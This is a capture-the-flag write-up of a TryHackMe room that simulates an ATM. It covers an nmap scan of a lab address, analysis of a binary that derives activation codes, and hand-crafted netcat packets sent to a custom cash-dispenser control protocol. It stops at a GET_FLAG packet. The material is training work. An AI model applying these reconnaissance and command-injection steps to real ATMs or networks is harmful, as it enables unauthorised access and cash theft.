# [JACKPOT (TryHackMe)](https://tryhackme.com/room/jackpot)

Jackpot challenges us to review a simulated endpoint ATM taken offline for maintenance after a series of "unexplained cash-outs." 
Our goal is to identify and demonstrate this erroneous behavior by retracing the attack chain from start to finish.

### Passive Reconnaissance
The problem description describes the target as an ATM connected to the company's network, so I assume it communicates via standard IP/TCP network protocols. The description also mentions it responds to a custom protocol used to control its cash dispensers. It *should* only respond to this when the sender is on the ATM's LAN, but in practice it seems to respond regardless of the source.

### Active Reconnaissance
Since our implied role here is that of a sanctioned security analyst, stealth is of little concern. However, for the sake of learning and best-practices, I will prioritize it where possible.
Like any THM box, I start by joining the room and getting our target IP. For this writeup, the target will be **10.67.149.236**
Because the endpoint very likely supports IP/TCP but listens for some proprietary protocols, the target will likely listen for connections on some ports outside the most common ones. I start by scanning for open ports using the command
`nmap -sV -O 10.67.149.236`
  - sV checks to see what service is running on each open port
  - O attempts to identify the OS the target is running

Our scan reveals the following:

```
Nmap scan report for 10.67.149.236
Host is up (0.056s latency).`
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http       BaseHTTPServer 0.6 (Python 3.12.3)
9100/tcp open  jetdirect?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.991%E=4%D=11/14%OT=22%CT=1%CU=40114%PV=Y%DS=3%DC=I%G=Y%TM=6AF88
OS:D78%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=105%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%TS=
OS:A)SEQ(SP=105%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)SEQ(SP=107%GCD=1%ISR=108%TI=Z%
OS:CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%O4=M4E8
OS:ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W
OS:5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y
OS:%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From this, I learn our target is running Linux and has three open ports: SSH on 22, HTTP on 8080, and an unknown service on port 9100.

> Note: nmap says port 910e0 is "jetdirect", which is a protocol used by some HP printers that allows direct streaming of print data. Because the target is an ATM not a printer, I assume this is erroneous

<br>

#### HTTP Port 8080

The HTTP port sounds most promising, so I start there. I access it by entering `http://10.67.149.236:8080` into a web browser.

<img width="2556" height="1355" alt="image" src="https://github.com/user-attachments/assets/a06f6a97-8f9d-4ba9-95d1-324ba41d0b32" />
Figure 1: the home page displayed by connecting to port 8080 on the target machine
<br>
The web page I receive shows the status of four cassette trays holding cash inside the machine, telling us the machine contains 280 bills totaling $9,600. The web page also tells us that our connection has a session code of `043449`. Supervisor Mode is disabled, but the Terminal itself along with the Fraud Monitor are both active.
<br>
At the bottom, the web page links a service tool that lets us derive a supervisor access code from the session code. Clicking this link downloads an unknown file called "jackpot". 
<br>

#### "Jackpot" file

In a safe environment, I begin investigating the mystery file. I start by running the command `file jackpot` which tells me the following:
```
jackpot: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2e9a37729a5046405945de339a6e01a3004b2fb3, for GNU/Linux 3.2.0, stripped
```

So "jackpot" is an ELF file. We already have some insight into what it does because the web page describes it as a "terminal service tool [that] derives a supervisor activation code from the session code," so it seems like this binary will be the key to accessing some supervisor controls.

<br>

The next thing we perform is static analysis. Checking for strings reveals the binary's usage page:
```
Earth's National Bank - Terminal Engineering Tool
usage: %s <6-digit session code from ATM screen>
```
Though we could certainly see more with tools like Detect It Easy and Ghidra, I choose instead here to move on to dynamic analysis as I suspect information past this will not be very useful. We can come back if we get stuck.

<br> 

Still in our safe environment, I disable any network activity from the device in case the binary attempts to lock the machine we are accessing if it detects it is outside the branch LAN. If it checks for network as a prerequisite, I can attempt to spoof access via FakeNet-NG. I run the following commands to enable execution and run the binary:
```
chmod +x jackpot
./jackpot
```
This prints the same usage screen we extracted using `strings`. So instead, I run it again passing the session code from the webpage: `./jackpot 043449`. The binary runs, printing:
```
[*] session nonce : 043449
[*] activation code: 25951600
```
We'll keep this activation code for later in case we need it. For now, I circle back to the other open ports on the machine.


### Port 9100
Because we suspect our target end state involves talking over proprietary protocol, I choose to investigate this port before the open SSH port. We know the port communicates over TCP, so I initiate a connection using the command ``nc 10.67.149.236 9100`` which immediately prints the following:
```
�{
  "service": "Branch Engineering Gateway",
  "protocol": "XFS bridge",
  "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
  "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)",
  "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"},
  "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"
}
```
The reply to our TCP netcat connection with line breaks added for readability.

<br>

The JSON lays out some very interesting information, including the protocol name, expected format, reply format, and a way to access the help menu. A web search of the "XFS Protocol" reveals nothing of note (it turns out this protocol is an invention for the CTF), so I instead try to create a packet in the format it is expecting.

<br>

The first thing I want is more information. The description suggests I can get this by setting message type to 0x01 and command ID to 0x0304 (with leading zeros added to pad to four bytes). The last part of the protocol seems like it is used for passing extra data. To start, I'll set that to zero.

<br>

The easiest way to send raw bytes through a TCP connection is by piping an `echo` command through a new `nc` connection, so I craft the payload and do just that. The payload follows the format below:
```
01          00 00 03 04     00 00
msg_type    command id      data length
```
To get `echo` to evaluate this, I insert it into double quotes and escape it as a raw hexidecimal value using the prefix `\x`. The full command is:
```
echo -n "\x01\x00\x00\x03\x04\x00\x00" | nc 10.67.149.236 9100
```

> Note: the -n flag removes the trailing newline that echo would otherwise append to the end of our bytestring

<br>

The machine responds affirmatively to our request for more information, replying with:
```
�{
  "service": "Branch Engineering Gateway",
  "protocol": "XFS bridge",
  "request_format": "1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
  "reply_format": "2 byte big-endian length + <length> bytes of JSON (this banner uses the same framing)",
  "msg_types": {"GETINFO": "0x01", "EXECUTE": "0x02"},
  "hint": "query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO for the full command table"
}
s{
  "rc": "WFS_SUCCESS",
  "interface": "Branch Engineering Gateway (XFS bridge)",
  "device_class": "CDM",
  "commands": {
        "WFS_INF_CDM_STATUS": "0x301",
        "WFS_INF_CDM_CASH_UNIT_INFO": "0x303",
        "WFS_INF_CDM_CAPABILITIES": "0x304",
        "WFS_CMD_CDM_DISPENSE": "0x401",
        "WFS_CMD_CDM_ARM": "0x4f0",
        "WFS_CMD_CDM_SET_MONITOR": "0x4f1",
        "WFS_CMD_CDM_GET_FLAG": "0x4ff"
  },
  "max_dispense": 40
}
```
This list contains some promising commands, like `DISPENSE` and `GET_FLAG`.

<br>

With this command list, we're ready to dive into some more obtrusive exploitation.

### Exploitation Phase

The first command I attempt is `GET_FLAG`. While I could build another payload and send it using the method from above, I have no idea if future commands are going to rely on an existing authenticated connection to operate. The `echo | nc` strategy only lets us send one raw-byte packet before interpreting all future input as ASCII instead.

<br> 

To solve this, I instead use a tool called [Hexicat](https://github.com/BurnHotter/Hexicat) that allows us to send multiple raw-byte packets over the same established connection. To connect, I download the script and run the command `./hexicat 10.67.149.236 9100`. From here, I can send raw bytes by converting them to hex and typing them out. I craft the following exploit string:
```
02          00 00 04 ff          00 00 
msg_type    command (GET_FLAG)   data length
```

<br>


